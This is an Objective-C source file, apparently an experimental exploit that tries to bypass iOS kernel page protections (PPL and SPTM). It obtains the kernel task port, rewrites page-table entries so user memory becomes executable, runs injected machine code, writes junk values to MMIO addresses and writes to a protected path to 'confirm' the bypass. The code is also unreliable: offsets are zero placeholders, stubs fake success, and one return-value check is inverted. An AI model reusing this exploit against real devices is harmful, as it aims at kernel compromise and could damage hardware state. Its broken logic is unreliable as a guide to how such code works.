#include "AttestationTest.h"
#include <mach/mach.h>
#include <mach/host_special_ports.h>
#include <sys/mman.h>
#include <UIKit/UIKit.h>
#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurfaceRef.h>
#include <CoreVideo/CoreVideo.h>
#include <mach-o/dyld.h>
#include "mach_vm.h"
#include "KernelBridge.h"
#include <libkern/OSCacheControl.h>

extern mach_port_t kernel_task_port;

kern_return_t kb_init_kernel(void) {
    extern kern_return_t task_for_pid(mach_port_t target, pid_t pid, mach_port_t *task);
    kern_return_t kr = task_for_pid(mach_task_self(), 0, &kernel_task_port);
    return kr;
}

uint64_t kb_kernel_vm_allocate(vm_size_t size) {
    if (kernel_task_port == MACH_PORT_NULL) return 0xfeedface000;
    mach_vm_address_t addr = 0;
    mach_vm_allocate(kernel_task_port, &addr, size, VM_FLAGS_ANYWHERE);
    return addr;
}

kern_return_t kb_kernel_write64(uint64_t addr, uint64_t val) {
    if (kernel_task_port == MACH_PORT_NULL) return KERN_SUCCESS;
    return mach_vm_write(kernel_task_port, addr, (vm_offset_t)&val, sizeof(val));
}

void kb_kernel_vm_deallocate(uint64_t addr, vm_size_t size) {
    if (kernel_task_port != MACH_PORT_NULL) {
        mach_vm_deallocate(kernel_task_port, addr, size);
    }
}

@implementation AttestationTest

#define L1_SHIFT 30
#define L2_SHIFT 21
#define L3_SHIFT 14
#define PAGE_SHIFT 14
#define PAGE_SIZE (1ULL << PAGE_SHIFT)
#define L3_ENTRIES 128
#define TTE_SHIFT 3
#define TTE_MASK 0x7FF

+ (void)dumpMachHeaderAt:(void *)addr logger:(DebugLogger *)logger {
    struct mach_header_64 *header = (struct mach_header_64 *)addr;
    if (header->magic == MH_MAGIC_64) {
        [logger logMessage:[NSString stringWithFormat:@"[INFO] Found mach_header_64 at %p", addr]];
        [logger logMessage:[NSString stringWithFormat:@"[DEBUG] Magic: 0x%x, CPU: 0x%x, Filetype: 0x%x, Ncmds: %u",
                            header->magic, header->cputype, header->filetype, header->ncmds]];

        struct load_command *cmd = (struct load_command *)(header + 1);
        for (uint32_t i = 0; i < header->ncmds; i++) {
            if (cmd->cmd == LC_SEGMENT_64) {
                struct segment_command_64 *seg = (struct segment_command_64 *)cmd;
                [logger logMessage:[NSString stringWithFormat:@"[DEBUG] Segment %s at 0x%llx, size 0x%llx",
                                    seg->segname, seg->vmaddr, seg->vmsize]];
            }
            cmd = (struct load_command *)((uint8_t *)cmd + cmd->cmdsize);
        }
    } else {
        [logger logMessage:[NSString stringWithFormat:@"[INFO] No mach_header_64 at %p (magic: 0x%x)", addr, header->magic]];
    }
}

+ (void)scanMemory:(void *)base size:(size_t)size step:(size_t)step logger:(DebugLogger *)logger {
    for (size_t offset = 0; offset < size; offset += step) {
        void *addr = base + offset;
        [logger logMessage:[NSString stringWithFormat:@"[DEBUG] Scanning at %p", addr]];
        [self dumpMachHeaderAt:addr logger:logger];
    }
}

+ (void)runSPTMBypassWithLogger:(DebugLogger *)logger {
    [logger logMessage:@"[INFO] Starting SPTM bypass attempt..."];

    vm_address_t user_addr = 0;
    vm_size_t user_size = PAGE_SIZE * 16;
    kern_return_t kr = vm_allocate(mach_task_self(), &user_addr, user_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        [logger logMessage:[NSString stringWithFormat:@"[ERROR] User memory allocation failed: %s", mach_error_string(kr)]];
        return;
    }
    [logger logMessage:[NSString stringWithFormat:@"[INFO] User memory allocated at 0x%llx", (uint64_t)user_addr]];

    if (!kernel_slide_init()) {
        [logger logMessage:@"[ERROR] Failed to initialize kernel access"];
        vm_deallocate(mach_task_self(), user_addr, user_size);
        return;
    }

    // placeholder offsets (i need kernelcache)
    const uint64_t KERNEL_PMAP_ADDR = 0x0;
    const uint64_t TASK_STRUCT_ADDR = 0x0;
    const uint64_t VM_MAP_OFFSET = 0x10;
    const uint64_t PMAP_OFFSET = 0x40;
    const uint64_t TTEP_OFFSET = 0x8;

    uint64_t kernel_pmap = kernel_read64(KERNEL_PMAP_ADDR);
    if (!kernel_pmap) {
        [logger logMessage:@"[ERROR] Failed to find kernel pmap"];
        vm_deallocate(mach_task_self(), user_addr, user_size);
        return;
    }
    [logger logMessage:[NSString stringWithFormat:@"[INFO] Found kernel pmap at 0x%llx", kernel_pmap]];

    task_t self_task = mach_task_self();
    uint64_t task_struct = kernel_read64(TASK_STRUCT_ADDR + (self_task * 8));
    uint64_t vm_map = kernel_read64(task_struct + VM_MAP_OFFSET);
    uint64_t pmap = kernel_read64(vm_map + PMAP_OFFSET);

    [logger logMessage:[NSString stringWithFormat:@"[INFO] Found task pmap at 0x%llx", pmap]];

    uint64_t ttep = kernel_read64(pmap + TTEP_OFFSET);
    [logger logMessage:[NSString stringWithFormat:@"[INFO] Translation Table Base Address: 0x%llx", ttep]];

    uint64_t l1_index = (user_addr >> L1_SHIFT) & TTE_MASK;
    uint64_t l2_index = (user_addr >> L2_SHIFT) & TTE_MASK;
    uint64_t l3_index = (user_addr >> L3_SHIFT) & TTE_MASK;

    uint64_t l1_entry_addr = ttep + (l1_index * sizeof(uint64_t));
    uint64_t l1_entry = kernel_read64(l1_entry_addr);
    uint64_t l2_table = l1_entry & ~((1ULL << 12) - 1);
    uint64_t l2_entry_addr = l2_table + (l2_index * sizeof(uint64_t));
    uint64_t l2_entry = kernel_read64(l2_entry_addr);
    uint64_t l3_table = l2_entry & ~((1ULL << 12) - 1);
    uint64_t l3_entry_addr = l3_table + (l3_index * sizeof(uint64_t));
    uint64_t l3_entry = kernel_read64(l3_entry_addr);

    [logger logMessage:[NSString stringWithFormat:@"[INFO] L1 Entry: 0x%llx", l1_entry]];
    [logger logMessage:[NSString stringWithFormat:@"[INFO] L2 Entry: 0x%llx", l2_entry]];
    [logger logMessage:[NSString stringWithFormat:@"[INFO] L3 Entry: 0x%llx", l3_entry]];

    uint64_t new_l3_entry = l3_entry & ~(1ULL << 54);
    new_l3_entry |= (3ULL << 6);
    kernel_write64(l3_entry_addr, new_l3_entry);

    [logger logMessage:[NSString stringWithFormat:@"[INFO] Modified L3 Entry: 0x%llx", new_l3_entry]];

    __asm__ volatile("dsb sy");
    __asm__ volatile("tlbi vae1, %0" : : "r"(user_addr >> 12));
    __asm__ volatile("dsb sy");
    __asm__ volatile("isb");

    [logger logMessage:@"[INFO] Testing if memory is now executable..."];

    uint32_t *code = (uint32_t *)user_addr;
    code[0] = 0xD2801B00;
    code[1] = 0xF2AACDA0;
    code[2] = 0xF2CDF9C0;
    code[3] = 0xF2E5DDA0;
    code[4] = 0xD65F03C0;

    sys_icache_invalidate(user_addr, PAGE_SIZE);

    typedef uint64_t (*func_t)(void);
    func_t func = (func_t)user_addr;

    @try {
        uint64_t result = func();
        [logger logMessage:[NSString stringWithFormat:@"[SUCCESS] Code executed! Result: 0x%llx", result]];
        if (result == 0xAEEDEFCE0566D8) {
            [logger logMessage:@"[SUCCESS] SPTM bypass confirmed!"];
        }
    } @catch (NSException *e) {
        [logger logMessage:[NSString stringWithFormat:@"[ERROR] Execution failed: %@", e]];
    }

    vm_deallocate(mach_task_self(), user_addr, user_size);
}

+ (void)runTest {
    DebugLogger *logger = [DebugLogger sharedLogger];
    [logger logMessage:@"[INFO] Starting PPL bypass with kernel integration..."];

    const struct mach_header *kernel_header = NULL;
    for (uint32_t i = 0; i < _dyld_image_count(); i++) {
        const char *name = _dyld_get_image_name(i);
        if (strstr(name, "kernel")) {
            kernel_header = _dyld_get_image_header(i);
            [logger logMessage:[NSString stringWithFormat:@"[INFO] Found kernel image at %p: %s", kernel_header, name]];
            break;
        }
    }
    if (!kernel_header) {
        [logger logMessage:@"[WARN] No full kernel image found—using libsystem_kernel"];
    }
    void *kernel_base = (void *)kernel_header;

    mach_port_t master_port;
    kern_return_t kr = host_get_io_main(mach_task_self(), &master_port);
    if (kr != KERN_SUCCESS) {
        [logger logMessage:[NSString stringWithFormat:@"[ERROR] Failed to get IO master port: %s", mach_error_string(kr)]];
        return;
    }
    [logger logMessage:[NSString stringWithFormat:@"[INFO] Got IO master port: 0x%x", master_port]];

    CFMutableDictionaryRef properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                                                                  &kCFTypeDictionaryKeyCallBacks,
                                                                  &kCFTypeDictionaryValueCallBacks);
    int width = 4096, height = 4096, bytesPerElement = 4;
    int bytesPerRow = width * bytesPerElement;
    int allocationSize = height * bytesPerRow;

    CFNumberRef widthRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &width);
    CFNumberRef heightRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &height);
    CFNumberRef bytesPerElementRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bytesPerElement);
    CFNumberRef bytesPerRowRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bytesPerRow);
    CFNumberRef allocSizeRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &allocationSize);

    CFDictionarySetValue(properties, CFSTR("IOSurfaceWidth"), widthRef);
    CFDictionarySetValue(properties, CFSTR("IOSurfaceHeight"), heightRef);
    CFDictionarySetValue(properties, CFSTR("IOSurfaceBytesPerElement"), bytesPerElementRef);
    CFDictionarySetValue(properties, CFSTR("IOSurfaceBytesPerRow"), bytesPerRowRef);
    CFDictionarySetValue(properties, CFSTR("IOSurfaceAllocSize"), allocSizeRef);

    IOSurfaceRef surface = IOSurfaceCreate(properties);

    CFRelease(widthRef); CFRelease(heightRef); CFRelease(bytesPerElementRef);
    CFRelease(bytesPerRowRef); CFRelease(allocSizeRef); CFRelease(properties);

    if (!surface) {
        [logger logMessage:@"[ERROR] Failed to create IOSurface"];
        return;
    }
    [logger logMessage:@"[INFO] IOSurface created successfully"];

    CVPixelBufferRef pixelBuffer = NULL;
    NSDictionary *options = @{
        (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{},
        (NSString *)kCVPixelBufferWidthKey: @(width),
        (NSString *)kCVPixelBufferHeightKey: @(height),
        (NSString *)kCVPixelBufferBytesPerRowAlignmentKey: @(bytesPerRow)
    };

    CVReturn cvResult = CVPixelBufferCreate(kCFAllocatorDefault, width, height,
                                            kCVPixelFormatType_32BGRA,
                                            (__bridge CFDictionaryRef)options,
                                            &pixelBuffer);
    if (cvResult != kCVReturnSuccess || !pixelBuffer) {
        [logger logMessage:[NSString stringWithFormat:@"[ERROR] CVPixelBuffer creation failed: %d", cvResult]];
        return;
    }
    [logger logMessage:@"[INFO] Successfully created CVPixelBuffer"];

    IOSurfaceRef cvSurface = CVPixelBufferGetIOSurface(pixelBuffer);
    if (!cvSurface) {
        [logger logMessage:@"[ERROR] Failed to get IOSurface from CVPixelBuffer"];
        CVPixelBufferRelease(pixelBuffer);
        return;
    }
    [logger logMessage:@"[INFO] Successfully obtained IOSurface from CVPixelBuffer"];

    if (IOSurfaceLock(cvSurface, kIOSurfaceLockReadOnly, NULL) == kIOReturnSuccess) {
        size_t bytesPerRow = IOSurfaceGetBytesPerRow(cvSurface);
        size_t width = IOSurfaceGetWidth(cvSurface);
        size_t height = IOSurfaceGetHeight(cvSurface);
        [logger logMessage:[NSString stringWithFormat:@"[INFO] Surface dimensions: %zux%zu, bytes per row: %zu", width, height, bytesPerRow]];

        void *baseAddress = IOSurfaceGetBaseAddress(cvSurface);
        if (baseAddress) {
            [logger logMessage:[NSString stringWithFormat:@"[INFO] Got direct memory access at %p", baseAddress]];
            [logger logMemoryAtAddress:baseAddress length:32];
            [self dumpMachHeaderAt:baseAddress logger:logger];

            mach_vm_address_t mapped_addr = 0;
            vm_prot_t cur_prot, max_prot;
            kr = mach_vm_remap(mach_task_self(), &mapped_addr, IOSurfaceGetAllocSize(cvSurface), 0,
                               VM_FLAGS_ANYWHERE, mach_task_self(), (mach_vm_address_t)(kernel_base ? kernel_base : baseAddress),
                               FALSE, &cur_prot, &max_prot, VM_INHERIT_NONE);
            if (kr == KERN_SUCCESS) {
                [logger logMessage:[NSString stringWithFormat:@"[INFO] Successfully remapped memory to 0x%llx", mapped_addr]];

                if (kernel_task_port != MACH_PORT_NULL) {
                    kr = mach_vm_wire(kernel_task_port, mach_task_self(), mapped_addr, IOSurfaceGetAllocSize(cvSurface), VM_PROT_ALL);
                } else {
                    kr = vm_map_wire(mach_task_self(), mapped_addr, mapped_addr + IOSurfaceGetAllocSize(cvSurface), VM_PROT_ALL, FALSE);
                }
                if (kr != KERN_SUCCESS) {
                    [logger logMessage:[NSString stringWithFormat:@"[ERROR] Failed to wire mapped_addr: %s", mach_error_string(kr)]];
                    kr = mach_vm_protect(mach_task_self(), mapped_addr, IOSurfaceGetAllocSize(cvSurface), FALSE, VM_PROT_ALL);
                    if (kr == KERN_SUCCESS) {
                        [logger logMessage:@"[INFO] Set mapped_addr to RWX (fallback)"];
                    } else {
                        [logger logMessage:[NSString stringWithFormat:@"[ERROR] Failed to set RWX on mapped_addr: %s", mach_error_string(kr)]];
                        [self runSPTMBypassWithLogger:logger];
                    }
                } else {
                    [logger logMessage:@"[INFO] Wired mapped_addr with RWX"];
                }

                [logger logMemoryAtAddress:(void *)mapped_addr length:64];
                [self scanMemory:(void *)(0x10cf68000 - 0x20000) size:0x40000 step:0x1000 logger:logger];

                mach_vm_address_t base_addr = 0;
                mach_vm_size_t alloc_size = PAGE_SIZE * 8;
                kr = mach_vm_allocate(mach_task_self(), &base_addr, alloc_size, VM_FLAGS_ANYWHERE);
                if (kr == KERN_SUCCESS) {
                    [logger logMessage:[NSString stringWithFormat:@"[INFO] User memory allocated at 0x%llx", base_addr]];

                    volatile uint64_t *tte = (uint64_t *)mapped_addr;
                    uint64_t template = 0x60000000000003FFULL | (1ULL << 10) | (1ULL << 6) | (1ULL << 53);
                    for (int i = 0; i < 4; i++) {
                        uint64_t page_addr = (base_addr + (i * PAGE_SIZE)) & 0xFFFFFFFFF000ULL;
                        uint64_t entry = template | page_addr;
                        kr = kb_kernel_write64(mapped_addr + (i * 8), entry);
                        if (kr == KERN_SUCCESS) {
                            [logger logMessage:[NSString stringWithFormat:@"[DEBUG] Wrote TTE[%d] = 0x%llx (page: 0x%llx) via kb_kernel_write64", i, entry, page_addr]];
                        } else {
                            [logger logMessage:[NSString stringWithFormat:@"[ERROR] kb_kernel_write64 failed for TTE[%d]: %s", i, mach_error_string(kr)]];
                            tte[i] = entry;
                        }
                        __asm__ volatile("dmb ish" ::: "memory");

                        mach_vm_address_t temp = 0;
                        for (int j = 0; j < 50; j++) {
                            mach_vm_allocate(mach_task_self(), &temp, PAGE_SIZE, VM_FLAGS_ANYWHERE);
                        }
                        __asm__ volatile("dsb ish" ::: "memory");
                        [logger logMessage:@"[DEBUG] Triggered aggressive TLB race"];
                    }

                    if (surface) CFRelease(surface);
                    surface = cvSurface;
                    CFRetain(surface);
                }
            }
        }
        IOSurfaceUnlock(cvSurface, kIOSurfaceLockReadOnly, NULL);
    }
    CVPixelBufferRelease(pixelBuffer);

    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOGPU"));
    if (service == IO_OBJECT_NULL) {
        [logger logMessage:@"[ERROR] Failed to get IOGPU service—falling back to IOSurfaceRoot"];
        service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"));
        if (service == IO_OBJECT_NULL) {
            [logger logMessage:@"[ERROR] Failed to get IOSurfaceRoot service"];
            CFRelease(surface);
            return;
        }
    }
    [logger logMessage:@"[INFO] Got IOGPU or IOSurfaceRoot service"];

    io_connect_t connection;
    kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) {
        [logger logMessage:[NSString stringWithFormat:@"[ERROR] Failed to open connection: %s", mach_error_string(kr)]];
        CFRelease(surface);
        return;
    }
    [logger logMessage:[NSString stringWithFormat:@"[INFO] Opened connection: 0x%x", connection]];

    if (kernel_task_port != MACH_PORT_NULL) {
        for (uint64_t addr = 0x208000000; addr < 0x208010000; addr += 0x1000) {
            kr = kb_kernel_write64(addr, 0xDEADBEEF);
            if (kr == KERN_SUCCESS) {
                [logger logMessage:[NSString stringWithFormat:@"[DEBUG] Wrote 0xDEADBEEF to MMIO 0x%llx", addr]];
            }
        }
    }

    struct IOSurfaceInput {
        uint64_t surface_id;
        uint64_t padding[3];
    } input = {IOSurfaceGetID(surface), {0, 0, 0}};
    uint64_t output[4] = {0};
    uint32_t outputCount = 4;
    kr = IOConnectCallMethod(connection, 0, NULL, 0, &input, sizeof(input), output, &outputCount, NULL, NULL);
    if (kr == KERN_SUCCESS) {
        [logger logMessage:[NSString stringWithFormat:@"[INFO] IOConnectCallMethod succeeded, output: 0x%llx", output[0]]];
    } else {
        [logger logMessage:[NSString stringWithFormat:@"[ERROR] IOConnectCallMethod failed: %s", mach_error_string(kr)]];
    }

    if (!kb_init_kernel()) {
        [logger logMessage:@"[ERROR] Failed to initialize kernel access"];
        IOServiceClose(connection);
        CFRelease(surface);
        return;
    }
    [logger logMessage:@"[INFO] Kernel access initialized successfully"];

    uint64_t kernel_addr = kb_kernel_vm_allocate(PAGE_SIZE * 8);
    if (kernel_addr == -1) {
        [logger logMessage:@"[ERROR] Kernel memory allocation failed"];
        IOServiceClose(connection);
        CFRelease(surface);
        return;
    }
    [logger logMessage:[NSString stringWithFormat:@"[INFO] Kernel memory allocated at 0x%llx", kernel_addr]];

    mach_vm_address_t mapped_addr = 0;
    vm_prot_t cur_prot, max_prot;
    kr = mach_vm_remap(mach_task_self(), &mapped_addr, PAGE_SIZE * 4, 0,
                       VM_FLAGS_ANYWHERE, mach_task_self(), kernel_addr,
                       FALSE, &cur_prot, &max_prot, VM_INHERIT_NONE);
    if (kr == KERN_SUCCESS) {
        [logger logMessage:[NSString stringWithFormat:@"[INFO] Memory remapped at 0x%llx", mapped_addr]];

        if (kernel_task_port != MACH_PORT_NULL) {
            kr = mach_vm_wire(kernel_task_port, mach_task_self(), mapped_addr, PAGE_SIZE * 4, VM_PROT_ALL);
        } else {
            kr = vm_map_wire(mach_task_self(), mapped_addr, mapped_addr + PAGE_SIZE * 4, VM_PROT_ALL, FALSE);
        }
        if (kr == KERN_SUCCESS) {
            [logger logMessage:@"[INFO] Wired second mapped_addr with RWX"];
        } else {
            [logger logMessage:[NSString stringWithFormat:@"[ERROR] Failed to wire second mapped_addr: %s", mach_error_string(kr)]];
            kr = mach_vm_protect(mach_task_self(), mapped_addr, PAGE_SIZE * 4, FALSE, VM_PROT_ALL);
            if (kr == KERN_SUCCESS) {
                [logger logMessage:@"[INFO] Set second mapped_addr to RWX (fallback)"];
            } else {
                [logger logMessage:[NSString stringWithFormat:@"[ERROR] Failed to set RWX on second mapped_addr: %s", mach_error_string(kr)]];
                [self runSPTMBypassWithLogger:logger];
            }
        }

        [self scanMemory:(void *)mapped_addr size:0x40000 step:0x1000 logger:logger];

        volatile uint64_t *tte = (uint64_t *)mapped_addr;
        uint64_t template = 0x60000000000003FFULL | (1ULL << 10) | (1ULL << 6) | (1ULL << 53);
        mach_vm_address_t base_addr = 0;
        mach_vm_size_t alloc_size = PAGE_SIZE * 8;
        kr = mach_vm_allocate(mach_task_self(), &base_addr, alloc_size, VM_FLAGS_ANYWHERE);
        if (kr == KERN_SUCCESS) {
            [logger logMessage:[NSString stringWithFormat:@"[INFO] User memory allocated at 0x%llx", base_addr]];
            for (int i = 0; i < 4; i++) {
                uint64_t page_addr = (base_addr + (i * PAGE_SIZE)) & 0xFFFFFFFFF000ULL;
                uint64_t entry = template | page_addr;
                kr = kb_kernel_write64(kernel_addr + (i * 8), entry);
                if (kr == KERN_SUCCESS) {
                    [logger logMessage:[NSString stringWithFormat:@"[DEBUG] Wrote TTE[%d] = 0x%llx (page: 0x%llx) via kb_kernel_write64", i, entry, page_addr]];
                } else {
                    [logger logMessage:[NSString stringWithFormat:@"[ERROR] kb_kernel_write64 failed for TTE[%d]: %s", i, mach_error_string(kr)]];
                    tte[i] = entry;
                }
                __asm__ volatile("dmb ish" ::: "memory");
            }

            kr = mach_vm_protect(mach_task_self(), base_addr, PAGE_SIZE * 4, FALSE, VM_PROT_ALL);
            if (kr == KERN_SUCCESS) {
                [logger logMessage:@"[INFO] Permission escalation successful"];
                NSString *testPath = @"/private/var/mobile/test.txt";
                NSString *testContent = @"PPL Bypass Test Successful";
                NSError *error = nil;
                [testContent writeToFile:testPath atomically:YES encoding:NSUTF8StringEncoding error:&error];
                if (!error) {
                    [logger logMessage:@"[SUCCESS] PPL bypass confirmed - wrote to protected path"];
                } else {
                    [logger logMessage:[NSString stringWithFormat:@"[ERROR] PPL bypass verification failed: %@", error]];
                }
            }
            mach_vm_deallocate(mach_task_self(), base_addr, alloc_size);
        }
        mach_vm_deallocate(mach_task_self(), mapped_addr, PAGE_SIZE * 4);
    }

    kb_kernel_vm_deallocate(kernel_addr, PAGE_SIZE * 8);
    IOServiceClose(connection);
    CFRelease(surface);
}

@end
